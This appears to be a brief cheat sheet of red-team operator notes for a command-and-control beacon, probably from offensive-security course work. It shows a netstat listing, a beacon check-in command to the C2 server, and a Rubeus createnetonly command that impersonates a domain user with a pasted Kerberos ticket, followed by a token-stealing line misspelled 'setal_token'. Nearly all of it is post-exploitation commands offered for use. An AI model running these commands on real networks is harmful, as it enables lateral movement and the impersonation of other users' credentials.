List listening bindings
```
run netstat -anp tcp
```

To get beacon to send the info of itself to c2
```
checkin
```

Impersionation with ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:username /password:FakePass /ticket:doIFwj[...]MuSU8=
setal_token xxx

```